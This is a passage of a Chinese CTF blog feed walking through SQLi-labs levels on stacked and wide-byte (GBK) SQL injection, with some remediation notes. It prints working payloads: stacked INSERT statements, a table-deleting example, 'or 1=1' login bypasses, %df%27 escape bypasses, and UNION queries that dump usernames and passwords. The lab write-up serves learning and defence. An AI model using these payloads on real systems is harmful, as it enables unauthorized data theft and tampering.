一样的利用方式，当然布尔盲注，延时注入都可以参考Less-46，这里只演示堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;insert into users(id,username,password) values(52,&#x27;Less52&#x27;,&#x27;Less52&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="Less-53基于Bool-GET单引号字符型盲注堆叠注入"><a href="#Less-53基于Bool-GET单引号字符型盲注堆叠注入" class="headerlink" title="Less-53基于Bool_GET单引号字符型盲注堆叠注入"></a>Less-53基于Bool_GET单引号字符型盲注堆叠注入</h2><p> Less-51 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于 stacked injection 是  一样的利用方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;insert into users(id,username,password) values(53,&#x27;Less53&#x27;,&#x27;Less53&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="接下来的关卡就是挑战关了-回头再玩"><a href="#接下来的关卡就是挑战关了-回头再玩" class="headerlink" title="接下来的关卡就是挑战关了(回头再玩)"></a>接下来的关卡就是挑战关了(回头再玩)</h2>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>slqilabs靶场记录堆叠注入(八)</title>
      <link href="/ctf/sql/sel-slqilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5(%E5%85%AB)/"/>
      <url>/ctf/sql/sel-slqilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5(%E5%85%AB)/</url>
      
        <content type="html"><![CDATA[<h1 id="slqilabs靶场记录堆叠注入-八"><a href="#slqilabs靶场记录堆叠注入-八" class="headerlink" title="slqilabs靶场记录堆叠注入(八)"></a>slqilabs靶场记录堆叠注入(八)</h1><h2 id="Stacked-injections-堆叠注入"><a href="#Stacked-injections-堆叠注入" class="headerlink" title="Stacked injections-堆叠注入"></a>Stacked injections-堆叠注入</h2><p>从字面意思上来看就是一堆的sql语句一起执行.而在真实的运用中也是这样的,我们知道在mysql中,主要是在命令行中,每一条语句的结尾加;表示语句的结束.这样我们就想到了是不是可以多句一起使用.这个就叫stacked injection.</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>在sql中,分号;是用来表示一条sql语句的结束,试着想一下我们在;结束一个sql语句之后继续构造下一条语句,会不会一起执行?因为这个想法也就造成了堆叠注入.而union injection(联合注入)也是将两条语句合并在一起,两者之间有什么区别吗?区别就在于union或者union all执行的语句类型是有限的,可以用来执行查询语句,而堆叠注入可以执行的是任意的语句.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">户输入:</span><br><span class="line">1;delete from products</span><br><span class="line">服务器端产生的sql语句为:(因没有对输入的参数进行过滤)</span><br><span class="line">select * from products where productid=1;delete from products</span><br><span class="line">当执行查询后,第一条显示查询信息,第二条则将整个表进行删除</span><br></pre></td></tr></table></figure><h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境都可以执行,可能收到api或者数据库引擎不支持的限制,当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序</p><p>在我们的web系统中,因为代码通常只返回一个查询结果,因此,堆叠注入的第二个语句产生错或者结果只能被忽略,我们在前端界面是无法看到返回的结果的.因此,在读取数据时,我们建议使用union(联合)注入.同时在使用堆叠注入之前.我们也是需要知道一些数据库的相关信息的.</p><h2 id="less-38基于错误GET单引号字符型堆叠注入"><a href="#less-38基于错误GET单引号字符型堆叠注入" class="headerlink" title="less-38基于错误GET单引号字符型堆叠注入"></a>less-38基于错误GET单引号字符型堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181854531.png" alt="image-20220318185437441"></p><p>mysqli_multi_query()函数执行一个或多个针对数据库的查询.多个查询用分号进行分割.(有这个才能进行堆叠)分号我们可以加入新的语句</p><p>堆叠注入需要依靠前文所写的注入方式来获取数据库的信息(因为源代码没有进行任何过滤，还爆数据库错误信息，是最简单的SQL注入)，在这里只演示如何插入新的数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;insert into users(id,username,password) values(38,&#x27;wanan&#x27;,&#x27;1&#x27;)--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181904566.png" alt="image-20220318190414507"></p><p>可以发现语句已经写进去了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181905984.png" alt="image-20220318190544914"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP mysqli_multi_query() 函数</span><br><span class="line">mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</span><br><span class="line">一、mysql与mysqli的概念相关：</span><br><span class="line">1、mysql与mysqli都是php方面的函数集，与mysql数据库关联不大</span><br><span class="line">2、在php5版本之前，一般是用php的mysql函数去驱动mysql数据库的，比如mysql_query()的函数，属于面向过程3、在php5版本以后，增加了mysqli的函数功能，某种意义上讲，它是mysql系统函数的增强版，更稳定更高效更安全，与mysql_query()对应的有mysqli_query()，属于面向对象，用对象的方式操作驱动mysql数据库。mysqli有两种方式：一种是面对对象的，一种是面向过程的。</span><br><span class="line">二、mysql与mysqli的区别：</span><br><span class="line">1、mysql是非持继连接函数，mysql每次链接都会打开一个连接的进程。</span><br><span class="line">2、mysqli是永远连接函数，mysqli多次运行mysqli将使用同一连接进程,从而减少了服务器的开销。mysqli封装了诸如事务等一些高级操作，同时封装了DB操作过程中的很多可用的方法。</span><br></pre></td></tr></table></figure><h2 id="less-39基于错误GET数字型堆叠注入"><a href="#less-39基于错误GET数字型堆叠注入" class="headerlink" title="less-39基于错误GET数字型堆叠注入"></a>less-39基于错误GET数字型堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181911928.png" alt="image-20220318191134842"></p><p>数字型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(39,&#x27;less39&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="less-40基于BoolGET单引号小括号字符型盲注堆叠注入"><a href="#less-40基于BoolGET单引号小括号字符型盲注堆叠注入" class="headerlink" title="less-40基于BoolGET单引号小括号字符型盲注堆叠注入"></a>less-40基于BoolGET单引号小括号字符型盲注堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181912928.png" alt="image-20220318191238843"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;);insert into users values(40,&#x27;Less40&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="less-41基于BoolGET数字型盲注堆叠注入"><a href="#less-41基于BoolGET数字型盲注堆叠注入" class="headerlink" title="less-41基于BoolGET数字型盲注堆叠注入"></a>less-41基于BoolGET数字型盲注堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181918987.png" alt="image-20220318191828896"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;insert into users values(41,&#x27;Less41&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="less-42基于存储POST单引号字符型堆叠注入"><a href="#less-42基于存储POST单引号字符型堆叠注入" class="headerlink" title="less-42基于存储POST单引号字符型堆叠注入"></a>less-42基于存储POST单引号字符型堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181919573.png" alt="image-20220318191945474"></p><p>这关看起来和less-24是一样的界面,但是实际上是有不同的,我们点击新建一个用户</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181923487.png" alt="image-20220318192312399"></p><p>需要进行创建用户再进行侵入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;insert into users(id,username,password) values(42,&#x27;Less42&#x27;,&#x27;Less42&#x27;)#</span><br></pre></td></tr></table></figure><p>成功使用新建的用户登录进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181928433.png" alt="image-20220318192800345"></p><h2 id="less-43基于存储POST单引号小括号字符型堆叠注入"><a href="#less-43基于存储POST单引号小括号字符型堆叠注入" class="headerlink" title="less-43基于存储POST单引号小括号字符型堆叠注入"></a>less-43基于存储POST单引号小括号字符型堆叠注入</h2><p>本关与 42 关的原理基本一致，我们还是定位在 login.php 中的 password。看一下 sql 语句为:</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181931983.png" alt="image-20220318193155911"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;);insert into users values(43,&#x27;Less43&#x27;,&#x27;Less43&#x27;)#</span><br></pre></td></tr></table></figure><h2 id="Less-44基于存储POST单引号字符型盲注堆叠注入"><a href="#Less-44基于存储POST单引号字符型盲注堆叠注入" class="headerlink" title="Less-44基于存储POST单引号字符型盲注堆叠注入"></a>Less-44基于存储POST单引号字符型盲注堆叠注入</h2><p>本关是基于盲注的，这里盲注主要是要没有报错信息，所以要采用盲注。这关与 42 关的区  别就在于没有报错信息，当 POST 没有报错回显时，判断查询语句就需要构造永真条件同化登录失败与查询出错，通过返回的图片不同来确定是否符合查询语句闭合的条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1 or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&#x27; or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&quot; or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&#x27;) or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;insert into users values (&#x27;44&#x27;,&#x27;less44&#x27;,&#x27;hello&#x27;)#</span><br></pre></td></tr></table></figure><h2 id="less-45基于存储POST单引号小括号字符型盲注堆叠注入"><a href="#less-45基于存储POST单引号小括号字符型盲注堆叠注入" class="headerlink" title="less-45基于存储POST单引号小括号字符型盲注堆叠注入"></a>less-45基于存储POST单引号小括号字符型盲注堆叠注入</h2><p>45 关与 43 关的 payload 是一样的，只不过 45 关依旧没有报错信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;);insert into users(id,username,password) values(45,&#x27;Less45&#x27;,&#x27;Less45&#x27;)#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>slilabs靶场记录宽字节绕过(七)</title>
      <link href="/ctf/sql/sql-slilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87(%E4%B8%83)/"/>
      <url>/ctf/sql/sql-slilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87(%E4%B8%83)/</url>
      
        <content type="html"><![CDATA[<h1 id="slilabs靶场记录宽字节绕过-七"><a href="#slilabs靶场记录宽字节绕过-七" class="headerlink" title="slilabs靶场记录宽字节绕过(七)"></a>slilabs靶场记录宽字节绕过(七)</h1><h2 id="宽字节注入的了解"><a href="#宽字节注入的了解" class="headerlink" title="宽字节注入的了解"></a>宽字节注入的了解</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mysql在使用GBK编码的时候会认为两个字符为一个汉字,例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围).我们在过滤’时,往往利用的思路是将’转换为&#39;</p><p>php自带了一些转义特殊字符的函数,如addslanshes(),mysql_real_escape_string(),mysql_escape_string()等,这些函数可以用来防止sql注入</p><p>如id&#x3D;1’or’1’&#x3D;’1,单引号本来用来闭合语句,这些函数会自动转义这些闭合单引号,在这些单引号的前面加上转义字符,变为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1\&#x27;or\&#x27;1\&#x27;=\&#x27;1</span><br></pre></td></tr></table></figure><p>如此在sql查询中是一个普通的字符串,不能进行注入.</p><ol><li><p>%bb吃掉\</p><p> 如果程序的默认字符集是gbk等宽字节字符集,就有可能产生宽字节注入,绕过上述的过滤.</p><p> 若php使用的mysql_query(“set name gbk”)将默认字符集设置为gbk,而使用addslashes()转义用户输入,这使如果用户输入%bb%27,则addslashes()会在%27前面加上一个%5c字符,即转义字符.而在mysql使用gbk编码时,会认为两个字符为一个汉字,%bb%5c是一个宽字符(前一个ascii码大于128才能到达汉字的范围)也就是籠,也就是说%bb%5c%27&#x3D;籠’.这样的话’就看见逃逸出来,也就是未被\进行转义从而造成闭合语句,产生sql注入.%bb并不是唯一一个可以产生宽字符注入的字符,理论上%81到%fe都可以</p></li><li><p>过滤<code>\&#39;</code>中的\</p><p> 构造%bb%5c%5c%27,addslashes()会两个%5c和%27前面都加上\就%5c,变为%bb %5c%5c %5c%5c %5c%27 ,但是宽字符集会认为%bb%5c 是一个字符即为籠,则变为 %bb%5c %5c%5c %27即为 <code>籠\\\\&#39;</code>,四个\正好转义为两个,即’未被转义.</p></li></ol><h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>常见字符集</p><ol><li>ascii编码:单字节编码</li><li>latin1编码:字符节编码</li><li>gbk编码:使用一字节和双字节编码,0x00 - 0x7f 范围内是一位,和ascii保持一致.双字节的第一字节范围是 0x81 - 0xfe</li><li>utf-8编码:是用一至四字节编码,0x00 - 0x7f范围内是第一位,和ascii保持一致.其他字符用二至四字节变长表示</li></ol><p>宽字节就是两个以上的字节,宽字节注入产生的原因就是各种字符编码的不当操作,使攻击者可以通过宽字节编码绕过sqk注入防御</p><p>通常来说,一个gbk编码汉字,占用两个字节.一个utf-8编码的汉字,占用3个字节.在php中,我们可以通过输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo strlen(&quot;和&quot;);#2 gbk编码时</span><br><span class="line">echo strlen(&quot;和&quot;);#3utf-8编码时</span><br></pre></td></tr></table></figure><p>处理gbk之外,所有的ansi编码都是2个字节.ansi只是一个标准,在不同的电脑上它代表的编码可能不相同,比如简体中文系统中ansi就是代表gbk</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>首先我们了解下宽字节注入,宽字节注入主要是源于程序员设置数据库编码与php编码这是为不同的两个编码那么就有可能产生宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据提交到mysql数据库,需要进行字符集的转换,使得mysql数据库可以对数据进行处理,这一过程一般有以下三个步骤:</span><br><span class="line">1.收到请求,将请求数据从character_set_client -&gt; character_set_coonection</span><br><span class="line">2.内部操作,将数据从character_set_connection -&gt; 表创建字符集</span><br><span class="line">3.结果输出,将数据从表创建的字符集 -&gt; character_set_results</span><br><span class="line"></span><br><span class="line">当执行set names &quot;字符集&quot;,相当于执行</span><br><span class="line">set character_set_client = 字符集</span><br><span class="line">set character_set_connection = 字符集</span><br><span class="line">set character_set_connection = 字符集</span><br><span class="line"></span><br><span class="line">client指的是php程序</span><br><span class="line">connection指的是php客户端与mysql服务器之间连接层</span><br><span class="line">results指的是mysql服务器返回给php客户端的结果</span><br><span class="line"></span><br><span class="line">mysql常见的乱码问题就是这三个字符集的设置不当所引起的</span><br></pre></td></tr></table></figure><p>宽字符是指两个字节宽度的编码技术，如UNICODE、GBK、BIG5等。当MYSQL数据库数据在处理和存储过程中，涉及到的字符集相关信息包括：</p><ol><li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li><li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li><li>character_set_database:数据库缺省编码字符集。</li><li>character_set_filesystem:文件系统编码字符集。</li><li>character_set_results:SQL语句执行结果编码字符集。</li><li>character_set_server:服务器缺省编码字符集。</li><li>character_set_system:系统缺省编码字符集。</li><li>character_sets_dir:字符集存放目录，一般不要修改。</li></ol><p>宽字节对转义字符的影响发生在character_set_client&#x3D;gbk的情况,也就是说如果客户端发送的数据字符集是gbk,则可能会吃掉转义字符,从而导致转义失败</p><p>例如说php的编码时utf-8而mysql的编码设置了set names ‘gbk’ 或者是 set character_set_client&#x3D;gbk,这样配置会引发编码转换从而导致注入漏洞</p><h3 id="宽字符注入的修复"><a href="#宽字符注入的修复" class="headerlink" title="宽字符注入的修复"></a>宽字符注入的修复</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string函数来过滤用户输入.</span><br><span class="line">（也就是说，先不进行转义，首先以GBK编码的形式对提交上来的参数进行编码，然后再进行转义，（先编码也意味着反斜杠即5c不会出现，到下一步的转义引号才出现）这就造成了编码过后转义引号的反斜杠即字符5c不会和字符df变成一个宽字符，阻止了df 和 5c 的拼接，于是防宽字符注入成功）</span><br><span class="line">这个方式是可行的，但有部分老的cms，在多处使用addslashes来过滤字符串，我们不可能去一个一个把addslashes都修改成mysql_real_escape_string。我们第二个解决方案就是，将character_set_client设置为binary（二进制）。</span><br><span class="line">只需在所有sql语句前指定一下连接的形式是二进制：</span><br><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </span><br><span class="line">这几个变量是什么意思？</span><br><span class="line">当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</span><br><span class="line">然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</span><br><span class="line">所以，我们将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</span><br></pre></td></tr></table></figure><h2 id="less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入"><a href="#less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入" class="headerlink" title="less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入"></a>less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181313899.png" alt="image-20220318131351701"></p><p>可以看到这个check_addslashes()函数十个过滤 \ ‘ “ 的函数,分别在前面加上\</p><p>注意这里的mysql_query(“set name gbk”)</p><h3 id="确定宽字节注入"><a href="#确定宽字节注入" class="headerlink" title="确定宽字节注入"></a>确定宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1回显正常</span><br><span class="line">1&#x27;回显正常</span><br><span class="line">1&quot;回显正常</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181319160.png" alt="image-20220318131931097"></p><p>这里可以发现在输入的’前面加上了 ‘    </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181320859.png" alt="image-20220318132011795"></p><p>双引号也有</p><h3 id="尝试宽字节注入"><a href="#尝试宽字节注入" class="headerlink" title="尝试宽字节注入"></a>尝试宽字节注入</h3><p><strong>1ß’</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ß&#x27;url编码后 1%df%27</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181322433.png" alt="image-20220318132232359"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ß&quot;url编码后 1%df%22</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181323920.png" alt="image-20220318132345854"></p><p>get型的方式我们是以url形式提交的,因此数据会通过url编码,其实url编码就是一个字符ascii码的16进制.不过稍微有些变动,需要在前面加上”%”.比如”<code>\</code>“,他的ascii码是92,92的十六进制是5c,所以”<code>\</code>“的url编码就是%5c.那么汉字的url编码呢?如”胡”的ascii码是-17670,十六进制是BAFA,url编码时%BAFA (汉字转ascii码默认情况下,是使用扩展ascii,第一个字节为负数是(或理解为127以上)是识别,后加一个字节总共两个字节)</p><p>这里可以看出是单引号闭合的宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%df%27--+#</span><br></pre></td></tr></table></figure><p><strong><code>ß\\&#39;</code></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ß\\&#x27;--+url编码后1%df%5c%5c%27--+被addslashes后 %bb%5c %5c%5c %5c%5c %27 即籠\\\\&#x27;</span><br></pre></td></tr></table></figure><p>闭合之后剩下的就很简单了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line">-1%df%27 union select 1,2,database()--+</span><br><span class="line">爆表：</span><br><span class="line">-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line">或者将security转换为16进制:</span><br><span class="line">-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+</span><br><span class="line">爆字段:</span><br><span class="line">user转换为16进制：0x7573657273</span><br><span class="line">-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+</span><br><span class="line">爆数据:</span><br><span class="line">-1%df%27 union select 1,group_concat(username,0x7e,password),3 from security.users--+</span><br><span class="line">或者</span><br><span class="line">-1%df%27 union select 1,group_concat(username,0x7e,password),3 from users--+</span><br></pre></td></tr></table></figure><h2 id="less-33GET型-绕过AddSlashes-函数"><a href="#less-33GET型-绕过AddSlashes-函数" class="headerlink" title="less-33GET型-绕过AddSlashes()函数"></a>less-33GET型-绕过AddSlashes()函数</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181339863.png" alt="image-20220318133927781"></p><p>注意这里mysql_query(“set names gbk”)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181340826.png" alt="image-20220318134027759"></p><p>check_addslashes()函数也有改变,此时并不是自定义的函数,而是直接使用PHP自带的addslashes函数</p><p>addslashes函数转义 ‘ “ \ NULL字符</p><p>注意:默认的,php对所有的get post cookie数据自动运行addslashes()  (请注意:这个是在之前版本开启魔术引号时才会有的，在新版本中这个魔术引号已经废弃了). 所以不应对已转义的字符串使用addslashes(),因为这样会导致双层转义,遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测</p><p>strupslashes()函数用于删除有addslashes()函数添加的反斜杠</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆表:</span><br><span class="line">-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181346496.png" alt="image-20220318134654424"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Notice：使用 addslashes(),我们需要将 mysql_query 设置为 binary （即二进制）的方式，才能防御此漏洞。</span><br><span class="line">Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><p><strong>MySQL居然不区分大小</strong></p><p><strong>可以使用binary将字符串先转换为二进制字符串，在进行比较、</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过看MySQL手册可以知道，默认情况下，对MySQL数据库中的字段进行查询或者排序都是不区分大小写的。</span><br><span class="line">但是在有些应用中，需要进行区分大小写的操作，咋办？</span><br><span class="line"></span><br><span class="line">答：使用BINARY操作符。</span><br><span class="line">BINARY操作符将后面的字符串抛给一个二进制字符串。这是一种简单的方式来促使逐字节而不是逐字符的进行列比较。这使得比较区分大小写，即使该列不被定义为 BINARY或 BLOB。</span><br><span class="line">BINARY影响整个比较；它可以在任何操作数前被给定，而产生相同的结果。</span><br><span class="line"></span><br><span class="line">解决方法</span><br><span class="line">1、第一种是在创建表结构时候使用binary属性来定义字段：</span><br><span class="line">    create table if not exists user(</span><br><span class="line">        id int unsigned primary key auto_increment,</span><br><span class="line">        name varchar(32) binary,</span><br><span class="line">    )engine=myisam;</span><br><span class="line">或者在表结构创建好后使用alter来添加字段binary属性</span><br><span class="line">alter table user modify name varchar(32) binary ;</span><br><span class="line"></span><br><span class="line">2、第二种方法是在sql语句中使用bianry来进行区分大小写操作：</span><br><span class="line">    SELECT * FROM user where name=binary &#x27;maratrix&#x27;;</span><br><span class="line">    或者</span><br><span class="line">    SELECT * FROM user where binary name=&#x27;maratrix&#x27;;</span><br><span class="line">进过测试发现，使用SELECT * FROM user where name=binary &#x27;maratrix&#x27;;效率更高点，原因是将binary放在字符串前会使用索引（假设该字段存在索引），而将binary放在字段前面将不会使用索引，即使索引存在也不会使用。</span><br><span class="line"></span><br><span class="line">注意</span><br><span class="line">在一些语境中，假如你将一个编入索引的列派给BINARY, MySQL 将不能有效使用这个索引。</span><br></pre></td></tr></table></figure><h2 id="less-34基于错误POST单引号字符型addslashes-宽字节注入"><a href="#less-34基于错误POST单引号字符型addslashes-宽字节注入" class="headerlink" title="less-34基于错误POST单引号字符型addslashes()宽字节注入"></a>less-34基于错误POST单引号字符型addslashes()宽字节注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181353145.png" alt="image-20220318135353996"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181354633.png" alt="image-20220318135426534"></p><p>这一关是POST型注入,同样的将post传递进来的内容进行了转义处理,过滤了单引号,反斜杠.有之前的get请求的例子我们可以看到%df可以将转义的反斜杠给吃掉.而get型的方式我们是以url形式进行提交的,因此数据会通过urlencode,如何将方法用在post型中呢</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>这里基本上和get无差别,在less-32中使用%bb%27 或者 %bb%5c%5c%27代替’均可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库:</span><br><span class="line">uname=1%bb%27 union select 1,database() #&amp;passwd=1</span><br></pre></td></tr></table></figure><h3 id="编码转换注入"><a href="#编码转换注入" class="headerlink" title="编码转换注入"></a>编码转换注入</h3><p>将 UTF-8 的<code>&#39;</code>转换为 UTF-16 的<code>�&#39;</code>实现注入的方法。这个字符我也不知道是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库:</span><br><span class="line">uname=1�&#x27; union select 1,database() #&amp;passwd=1</span><br></pre></td></tr></table></figure><h2 id="less-35基于错误GET数字型addslashes-宽字节注入"><a href="#less-35基于错误GET数字型addslashes-宽字节注入" class="headerlink" title="less-35基于错误GET数字型addslashes()宽字节注入"></a>less-35基于错误GET数字型addslashes()宽字节注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181412390.png" alt="image-20220318141219233"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181413371.png" alt="image-20220318141324275"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;version for the right syntax to use near &#x27;\&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">id=1&quot;version for the right syntax to use near &#x27;\&quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>这关有错误回显,比较简单可以判断出是数字型.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么在没有错误回显时,应当如何去判断是数字型还是引号被过滤呢?</span><br><span class="line">在能分辨出正确回显和错误回显(有固定字符串)时,id=1正确回显,尝试id=1&#x27;和id=1&quot;</span><br><span class="line">若两者都正确回显:很可能是被过滤引号</span><br><span class="line">若两者都错误回显:很可能是数字型查询</span><br><span class="line">若一正确一错误:基本可以确定是字符型查询</span><br></pre></td></tr></table></figure><p>我们知道了数字型并且知道了使用addslashes()函数,那么剩下的其实就比较简单了,就是有一点点小的改动,就是如果注入语句出现的引号里面的数据需要转换为十六进制.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line">-1 union select 1,2,database()--+</span><br><span class="line">爆表:</span><br><span class="line">-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+</span><br><span class="line">爆字段:</span><br><span class="line">-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+</span><br><span class="line">爆数据:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>请注意:security转换为十六进制为0x7365637572697479是不包括引号的,转换为十六进制也不需要引号</p><h2 id="less-36GET-绕过-Mysql-real-escape-string-函数"><a href="#less-36GET-绕过-Mysql-real-escape-string-函数" class="headerlink" title="less-36GET-绕过 Mysql_real_escape_string 函数"></a>less-36GET-绕过 Mysql_real_escape_string 函数</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181424749.png" alt="image-20220318142440603"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string()函数转义的特殊字符 \x00 \n \r \ &#x27; &quot; \x1a</span><br><span class="line">本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于mysql_query()，可使用本函数来预防数据库攻击</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addslashes()能被宽字节注入的原因就是，它先进行转义，再进行GBK编码。</span><br><span class="line">    原理</span><br><span class="line">    对于宽字节编码，有一种最好的修补就是：</span><br><span class="line">    